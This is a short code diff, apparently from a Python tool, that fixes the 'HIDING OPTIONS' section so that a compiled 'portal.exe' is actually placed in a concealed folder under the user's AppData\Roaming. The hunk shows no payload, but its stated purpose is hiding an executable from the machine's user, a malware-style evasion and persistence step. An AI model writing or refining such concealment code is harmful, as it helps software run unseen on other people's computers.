@@ -457,7 +457,7 @@ me = singleton.SingleInstance()
 
 # HIDING OPTIONS
 # ---------------------------------------------
-appdata_roaming_folder = 'APPDATA'  # = 'C:\Users\Username\AppData\Roaming'
+appdata_roaming_folder = os.environ['APPDATA']  # = 'C:\Users\Username\AppData\Roaming'
 hide_folder = appdata_roaming_folder + r'\Portal'  # = 'C:\Users\Username\AppData\Roaming\Portal'
 compiled_name = 'portal.exe'  # Name of compiled .exe to hide in hide_folder, i.e 'C:\Users\Username\AppData\Roaming\Portal\portal.exe'
 # ---------------------------------------------
